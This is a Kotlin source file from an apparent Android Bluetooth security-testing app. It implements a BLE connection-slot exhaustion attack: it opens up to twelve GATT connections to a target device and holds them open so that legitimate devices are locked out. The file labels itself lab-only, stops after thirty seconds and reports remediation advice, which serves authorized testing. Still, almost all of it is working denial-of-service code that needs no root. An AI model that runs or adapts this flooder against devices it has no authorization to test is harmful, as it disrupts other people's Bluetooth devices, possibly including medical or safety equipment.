package com.bluetoothseclab.attacks

import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothGattCharacteristic
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.bluetoothseclab.models.AttackResult
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicBoolean

/**
 * BLE Connection Slot Exhaustion DoS (CVE-2026-52866 pattern).
 *
 * Real attack: rapidly opens GATT connections to exhaust the target's BLE client
 * connection slots. Most BLE devices support only 3-7 simultaneous connections.
 * By opening and holding connections, legitimate devices are blocked.
 *
 * No root required — uses standard Android BLE GATT API.
 *
 * Lab-only use. Auto-stops after MAX_DURATION_MS.
 */
object BleConnectionFlooder {

    private const val TAG = "BleConnFlooder"
    private const val MAX_CONNECTIONS = 12
    private const val CONNECTION_HOLD_MS = 8000L
    private const val CONNECTION_INTERVAL_MS = 500L
    private const val MAX_DURATION_MS = 30_000L
    private const val GATT_TIMEOUT_MS = 5000L

    private val isRunning = AtomicBoolean(false)
    private val handler = Handler(Looper.getMainLooper())

    data class FloodResult(
        val attemptedConnections: Int,
        val successfulConnections: Int,
        val failedConnections: Int,
        val avgConnectTimeMs: Long,
        val targetSupportsMultiple: Boolean,
        val slotsExhausted: Boolean
    )

    fun stop() {
        isRunning.set(false)
    }

    fun flood(
        device: BluetoothDevice,
        context: Context,
        onProgress: (String) -> Unit,
        onResult: (FloodResult) -> Unit,
        onComplete: (AttackResult) -> Unit
    ) {
        if (isRunning.getAndSet(true)) {
            handler.post { onComplete(
                AttackResult(
                    moduleName = "BLE Connection Flooder",
                    status = AttackResult.Status.FAILED,
                    findings = listOf(AttackResult.Finding(
                        title = "Already Running",
                        description = "A flood test is already in progress",
                        severity = AttackResult.Severity.INFO
                    )),
                    summary = "Skipped — already running",
                    riskScore = 0f,
                    durationMs = 0
                )
            )}
            return
        }

        val startTime = System.currentTimeMillis()
        val bluetoothManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        if (bluetoothManager == null) {
            isRunning.set(false)
            handler.post { onComplete(
                AttackResult(
                    moduleName = "BLE Connection Flooder",
                    status = AttackResult.Status.FAILED,
                    findings = listOf(AttackResult.Finding(
                        title = "No Bluetooth",
                        description = "BluetoothManager not available",
                        severity = AttackResult.Severity.INFO
                    )),
                    summary = "Failed: no Bluetooth manager",
                    riskScore = 0f,
                    durationMs = 0
                )
            )}
            return
        }

        Thread {
            val gattConnections = mutableListOf<BluetoothGatt>()
            val connectAttempts = AtomicInteger(0)
            val connectSuccesses = AtomicInteger(0)
            val connectFailures = AtomicInteger(0)
            val connectTimes = mutableListOf<Long>()
            var targetMulti = false

            // Auto-stop timer
            handler.postDelayed({ isRunning.set(false) }, MAX_DURATION_MS)

            try {
                handler.post { onProgress("[FLOOD] Starting BLE connection slot exhaustion...") }
                handler.post { onProgress("[FLOOD] Target: ${device.address} — Max $MAX_CONNECTIONS connections") }
                handler.post { onProgress("[FLOOD] Auto-stop in ${MAX_DURATION_MS / 1000}s") }

                for (i in 1..MAX_CONNECTIONS) {
                    if (!isRunning.get()) break

                    val attemptStart = System.currentTimeMillis()
                    connectAttempts.incrementAndGet()

                    handler.post { onProgress("[FLOOD] Connection $i/$MAX_CONNECTIONS...") }

                    val latch = CountDownLatch(1)
                    val connected = AtomicBoolean(false)

                    val gattCallback = object : BluetoothGattCallback() {
                        override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                            when (newState) {
                                BluetoothProfile.STATE_CONNECTED -> {
                                    connected.set(true)
                                    connectSuccesses.incrementAndGet()
                                    val elapsed = System.currentTimeMillis() - attemptStart
                                    synchronized(connectTimes) { connectTimes.add(elapsed) }
                                    handler.post { onProgress("[FLOOD] ✓ Connection $i established (${elapsed}ms)") }
                                    latch.countDown()
                                }
                                BluetoothProfile.STATE_DISCONNECTED -> {
                                    if (!connected.get()) {
                                        connectFailures.incrementAndGet()
                                        handler.post { onProgress("[FLOOD] ✗ Connection $i failed (status=$status)") }
                                    }
                                    latch.countDown()
                                }
                                BluetoothProfile.STATE_CONNECTING -> {
                                    handler.post { onProgress("[FLOOD] Connection $i connecting...") }
                                }
                            }
                        }

                        override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                            if (status == BluetoothGatt.GATT_SUCCESS) {
                                val serviceCount = gatt.services?.size ?: 0
                                handler.post { onProgress("[FLOOD] Connection $i: $serviceCount GATT services discovered") }
                                if (serviceCount > 3) targetMulti = true
                            }
                        }
                    }

                    try {
                        val gatt = device.connectGatt(context, false, gattCallback)
                        if (gatt != null) {
                            gattConnections.add(gatt)
                            // Discover services to keep connection active
                            handler.postDelayed({
                                try { gatt.discoverServices() } catch (_: Exception) {}
                            }, 1000)
                        } else {
                            connectFailures.incrementAndGet()
                        }
                    } catch (e: Exception) {
                        connectFailures.incrementAndGet()
                        handler.post { onProgress("[FLOOD] Connection $i error: ${e.message?.take(50)}") }
                    }

                    // Wait for connection or timeout
                    latch.await(GATT_TIMEOUT_MS, TimeUnit.MILLISECONDS)

                    val totalAttempts = connectAttempts.get()
                    val successes = connectSuccesses.get()
                    val failures = connectFailures.get()

                    handler.post {
                        onProgress("[FLOOD] Progress: $successes/$totalAttempts connected, $failures failed")
                    }

                    // If we got multiple simultaneous connections, target is vulnerable
                    if (successes >= 3) {
                        targetMulti = true
                    }

                    Thread.sleep(CONNECTION_INTERVAL_MS)
                }

                // Hold connections open briefly to demonstrate slot occupation
                val activeConns = gattConnections.count { it != null }
                if (activeConns > 0) {
                    handler.post { onProgress("[FLOOD] Holding $activeConns connections open...") }
                    Thread.sleep(CONNECTION_HOLD_MS)
                }

                val avgTime = if (connectTimes.isNotEmpty()) {
                    connectTimes.average().toLong()
                } else 0L

                val slotsExhausted = connectSuccesses.get() >= 3

                val result = FloodResult(
                    attemptedConnections = connectAttempts.get(),
                    successfulConnections = connectSuccesses.get(),
                    failedConnections = connectFailures.get(),
                    avgConnectTimeMs = avgTime,
                    targetSupportsMultiple = targetMulti,
                    slotsExhausted = slotsExhausted
                )

                handler.post { onResult(result) }

                // Build findings
                val findings = mutableListOf<AttackResult.Finding>()

                if (slotsExhausted) {
                    findings.add(AttackResult.Finding(
                        title = "BLE Connection Slots Exhausted",
                        description = "Successfully opened ${connectSuccesses.get()} simultaneous GATT connections. " +
                            "Most BLE devices support 3-7 connections. Legitimate devices would be blocked.",
                        severity = AttackResult.Severity.CRITICAL,
                        cveReference = "CVE-2026-52866 (pattern)",
                        remediation = "Limit simultaneous connections, implement connection rate limiting"
                    ))
                }

                if (targetMulti) {
                    findings.add(AttackResult.Finding(
                        title = "Multi-Connection Target Confirmed",
                        description = "Target accepted ${connectSuccesses.get()} concurrent GATT connections. " +
                            "This indicates the device does not enforce connection limits.",
                        severity = AttackResult.Severity.HIGH,
                        remediation = "Enforce max connection limit at firmware level"
                    ))
                }

                findings.add(AttackResult.Finding(
                    title = "Connection Attempt Results",
                    description = "Attempted: ${connectAttempts.get()}, " +
                        "Connected: ${connectSuccesses.get()}, " +
                        "Failed: ${connectFailures.get()}, " +
                        "Avg connect time: ${avgTime}ms",
                    severity = if (connectSuccesses.get() > 0) AttackResult.Severity.MEDIUM else AttackResult.Severity.LOW
                ))

                val elapsed = System.currentTimeMillis() - startTime
                handler.post {
                    onComplete(
                        AttackResult(
                            moduleName = "BLE Connection Flooder",
                            status = if (connectSuccesses.get() > 0) AttackResult.Status.SUCCESS else AttackResult.Status.PARTIAL,
                            findings = findings,
                            summary = "Connection slot exhaustion test: ${connectSuccesses.get()}/${connectAttempts.get()} connected" +
                                if (slotsExhausted) " — SLOTS EXHAUSTED" else "",
                            riskScore = if (slotsExhausted) 8.5f else if (connectSuccesses.get() > 0) 5.0f else 2.0f,
                            durationMs = elapsed
                        )
                    )
                }

            } catch (e: Exception) {
                val elapsed = System.currentTimeMillis() - startTime
                handler.post {
                    onComplete(
                        AttackResult(
                            moduleName = "BLE Connection Flooder",
                            status = AttackResult.Status.FAILED,
                            findings = listOf(AttackResult.Finding(
                                title = "Flood Error",
                                description = e.message ?: "Unknown error",
                                severity = AttackResult.Severity.INFO
                            )),
                            summary = "Flood failed: ${e.message}",
                            riskScore = 0f,
                            durationMs = elapsed
                        )
                    )
                }
            } finally {
                // Close all GATT connections
                for (gatt in gattConnections) {
                    try {
                        gatt?.disconnect()
                        gatt?.close()
                    } catch (_: Exception) {}
                }
                isRunning.set(false)
            }
        }.start()
    }
}
